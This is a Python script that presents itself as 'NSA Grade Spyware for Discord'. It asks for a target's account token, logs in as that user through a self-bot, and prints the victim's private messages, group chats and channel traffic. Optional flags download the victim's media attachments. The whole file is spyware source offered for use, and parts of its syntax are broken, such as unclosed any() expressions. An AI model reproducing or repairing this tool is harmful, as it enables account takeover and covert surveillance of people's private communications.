import discord
from discord.ext import commands
import asyncio
import os
import datetime
import platform

capServers = False
downloadMedia = False

#smart screen clearer
sysOs = platform.system()
if sysOs == "Linux":
	os.system("clear")
else:
	os.system("cls")


#print Welcome Banner
banner = """
\u001b[34m--------------
\u001b[34m| \u001b[32mWelcome to \u001b[34m|
\u001b[34m--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------                                                                                                       
\u001b[31mDDDDDDDDDDDDD          iiii                      SSSSSSSSSSSSSSS                                              
\u001b[31mD\u001b[36m::::::::::::\u001b[31mDDD      i\u001b[36m::::\u001b[31mi                   SS\u001b[36m:::::::::::::::\u001b[31mS                                             
\u001b[31mD\u001b[36m:::::::::::::::\u001b[31mDD     iiii                   S\u001b[36m:::::\u001b[31mSSSSSS\u001b[36m::::::\u001b[31mS                                             
\u001b[31mDDD\u001b[36m:::::\u001b[31mDDDDD\u001b[36m:::::\u001b[31mD                           S\u001b[36m:::::\u001b[31mS     SSSSSSS                                             
  \u001b[31mD\u001b[36m:::::\u001b[31mD    D\u001b[36m:::::\u001b[31mD iiiiiii     ssssssssss   S\u001b[36m:::::\u001b[31mS            ppppp   ppppppppp   yyyyyyy           yyyyyyy
  \u001b[31mD\u001b[36m:::::\u001b[31mD     D\u001b[36m:::::\u001b[31mDi\u001b[36m:::::\u001b[31mi   ss\u001b[36m::::::::::\u001b[31ms  S\u001b[36m:::::\u001b[31mS            p\u001b[36m::::\u001b[31mppp\u001b[36m:::::::::\u001b[31mp   y\u001b[36m:::::\u001b[31my         y\u001b[36m:::::\u001b[31my 
  \u001b[31mD\u001b[36m:::::\u001b[31mD     D\u001b[36m:::::\u001b[31mD i\u001b[36m::::\u001b[31mi ss\u001b[36m:::::::::::::\u001b[31ms  S\u001b[36m::::\u001b[31mSSSS         p\u001b[36m:::::::::::::::::\u001b[31mp   y\u001b[36m:::::\u001b[31my       y\u001b[36m:::::\u001b[31my  
  \u001b[31mD\u001b[36m:::::\u001b[31mD     D\u001b[36m:::::\u001b[31mD i\u001b[36m::::\u001b[31mi s\u001b[36m::::::\u001b[31mssss\u001b[36m:::::\u001b[31ms  SS\u001b[36m::::::\u001b[31mSSSSS    pp\u001b[36m::::::\u001b[31mppppp\u001b[36m::::::\u001b[31mp   y\u001b[36m:::::\u001b[31my     y\u001b[36m:::::\u001b[31my   
  \u001b[31mD\u001b[36m:::::\u001b[31mD     D\u001b[36m:::::\u001b[31mD i\u001b[36m::::\u001b[31mi  s\u001b[36m:::::\u001b[31ms  ssssss     SSS\u001b[36m::::::::\u001b[31mSS   p\u001b[36m:::::\u001b[31mp     p\u001b[36m:::::\u001b[31mp    y\u001b[36m:::::\u001b[31my   y\u001b[36m:::::\u001b[31my    
  \u001b[31mD\u001b[36m:::::\u001b[31mD     D\u001b[36m:::::\u001b[31mD i\u001b[36m::::\u001b[31mi    s\u001b[36m::::::\u001b[31ms             SSSSSS\u001b[36m::::\u001b[31mS  p\u001b[36m:::::\u001b[31mp     p\u001b[36m:::::\u001b[31mp     y\u001b[36m:::::\u001b[31my y\u001b[36m:::::\u001b[31my     
  \u001b[31mD\u001b[36m:::::\u001b[31mD     D\u001b[36m:::::\u001b[31mD i\u001b[36m::::\u001b[31mi       s\u001b[36m::::::\u001b[31ms               S\u001b[36m:::::\u001b[31mS p\u001b[36m:::::\u001b[31mp     p\u001b[36m:::::\u001b[31mp      y\u001b[36m:::::\u001b[31my\u001b[36m:::::\u001b[31my      
  \u001b[31mD\u001b[36m:::::\u001b[31mD    D\u001b[36m:::::\u001b[31mD  i\u001b[36m::::\u001b[31mi ssssss   s\u001b[36m:::::\u001b[31ms             S\u001b[36m:::::\u001b[31mS p\u001b[36m:::::\u001b[31mp    p\u001b[36m::::::\u001b[31mp       y\u001b[36m:::::::::\u001b[31my       
\u001b[31mDDD\u001b[36m:::::\u001b[31mDDDDD\u001b[36m:::::\u001b[31mD  i\u001b[36m::::::\u001b[31mis\u001b[36m:::::\u001b[31mssss\u001b[36m::::::\u001b[31msSSSSSSS     S\u001b[36m:::::\u001b[31mS p\u001b[36m:::::\u001b[31mppppp\u001b[36m:::::::\u001b[31mp        y\u001b[36m:::::::\u001b[31my        
\u001b[31mD\u001b[36m:::::::::::::::\u001b[31mDD   i\u001b[36m::::::\u001b[31mis\u001b[36m::::::::::::::\u001b[31ms S\u001b[36m::::::\u001b[31mSSSSSS\u001b[36m:::::\u001b[31mS p\u001b[36m::::::::::::::::\u001b[31mp          y\u001b[36m:::::\u001b[31my         
\u001b[31mD\u001b[36m::::::::::::\u001b[31mDDD     i\u001b[36m::::::\u001b[31mi s\u001b[36m:::::::::::\u001b[31mss  S\u001b[36m:::::::::::::::\u001b[31mSS  p\u001b[36m::::::::::::::\u001b[31mpp          y\u001b[36m:::::\u001b[31my          
\u001b[31mDDDDDDDDDDDDD        iiiiiiii  sssssssssss     SSSSSSSSSSSSSSS    p\u001b[36m::::::\u001b[31mpppppppp           y\u001b[36m:::::\u001b[31my           
                                                                  \u001b[31mp\u001b[36m:::::\u001b[31mp                  y\u001b[36m:::::\u001b[31my            
                                                                  \u001b[31mp\u001b[36m:::::\u001b[31mp                 y\u001b[36m:::::\u001b[31my             
                                                                 \u001b[31mp\u001b[36m:::::::\u001b[31mp               y\u001b[36m:::::\u001b[31my              
                                                                 \u001b[31mp\u001b[36m:::::::\u001b[31mp              y\u001b[36m:::::\u001b[31my               
                                                                 \u001b[31mp\u001b[36m:::::::\u001b[31mp             yyyyyyy                
                                                                 \u001b[31mppppppppp                                    
\u001b[34m--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
										| \u001b[31mNSA \u001b[32mGrade Spyware for \u001b[36mDiscord \u001b[31m- \u001b[33mPublic Version 1.0 \u001b[31m- \u001b[32mWritten by \u001b[35mOMN1-H1V3 \u001b[34m| 
										-----------------------------------------------------------------------------	\u001b[36m																												                                                                                    
"""
print(banner)
print("\n" * 19)
prefix = ""
client = discord.Client()
message = discord.Message 
bot = commands.Bot(command_prefix=prefix, self_bot=True)
token = input("Input Your \u001b[31mTarget\u001b[32m'\u001b[31ms \u001b[36mToken: ")
current_time = datetime.datetime.now()
print("---\u001b[33m " + str(current_time.year) + "/" + str(current_time.month) + "/" + str(current_time.day) + " \u001b[38;5;45m---")
@bot.event
async def on_message(message):
	image_types = [".png",".jpg",".jpeg",".mp4",".mp3"]
	current_time = datetime.datetime.now() #get current time
	time = str(current_time.hour) + ":" + str(current_time.minute) + ":" + str(current_time.second)
	if capServers == True:
		if message.channel.type is discord.ChannelType.text :
			async for message in message.channel.history(limit=1):
				if downloadMedia == True:
					if message.attachments == []:
						print(str(current_time.hour) + ":" + str(current_time.minute) + ":" + str(current_time.second) + " <\u001b[32m" + str(message.author) + "\u001b[38;5;45m/" + str(message.channel) + "> " + str(message.content))
					else:
						print("\u001b[33m Attachment Found! Downloading...\u001b[36m ")
						for attachment in message.attachments:
							if any(attachment.filename.lower().endswith(image)
								for image in image_types:
									await attachment.save(attachment.filename)
									print(str(current_time.hour) + ":" + str(current_time.minute) + ":" + str(current_time.second) + " <\u001b[32m" + str(message.author) + "\u001b[38;5;45m/" + str(message.channel) + "> " + str(message.content))
					pass
				else:
					print(str(current_time.hour) + ":" + str(current_time.minute) + ":" + str(current_time.second) + " <\u001b[32m" + str(message.author) + "\u001b[38;5;45m/" + str(message.channel) + "> " + str(message.content))
		else:
			pass
	elif message.channel.type is discord.ChannelType.group:
			async for message in message.channel.history(limit=1):
				if downloadMedia == True:
					if message.attachments == []:
						print(str(current_time.hour) + ":" + str(current_time.minute) + ":" + str(current_time.second) + " <\u001b[32m" + str(message.author) + "\u001b[38;5;45m/" + str(message.channel) + "> " + str(message.content))
					else:
						print("\u001b[33m Attachment Found! Downloading...\u001b[36m ")
						for attachment in message.attachments:
							if any(attachment.filename.lower().endswith(image)
								for image in image_types:
									await attachment.save(attachment.filename)
									print(str(current_time.hour) + ":" + str(current_time.minute) + ":" + str(current_time.second) + " <\u001b[32m" + str(message.author) + "\u001b[38;5;45m/" + str(message.channel) + "> " + str(message.content))
					pass
				else:
					print(str(current_time.hour) + ":" + str(current_time.minute) + ":" + str(current_time.second) + " <\u001b[32m" + str(message.author) + "\u001b[38;5;45m/" + str(message.channel) + "> " + str(message.content))
	elif message.channel.type is discord.ChannelType.private:
			async for message in message.channel.history(limit=1):
				if downloadMedia == True:
					if message.attachments == []:
						print(str(current_time.hour) + ":" + str(current_time.minute) + ":" + str(current_time.second) + " <\u001b[32m" + str(message.author) + "\u001b[38;5;45m/" + str(message.channel) + "> " + str(message.content))
					else:
						print("\u001b[33m Attachment Found! Downloading...\u001b[36m ")
						for attachment in message.attachments:
							if any(attachment.filename.lower().endswith(image)
								for image in image_types:
									await attachment.save(attachment.filename)
									print(str(current_time.hour) + ":" + str(current_time.minute) + ":" + str(current_time.second) + " <\u001b[32m" + str(message.author) + "\u001b[38;5;45m/" + str(message.channel) + "> " + str(message.content))
					pass
				else:
					print(str(current_time.hour) + ":" + str(current_time.minute) + ":" + str(current_time.second) + " <\u001b[32m" + str(message.author) + "\u001b[38;5;45m/" + str(message.channel) + "> " + str(message.content))
	else:
        	pass
bot.run(token, bot=False)
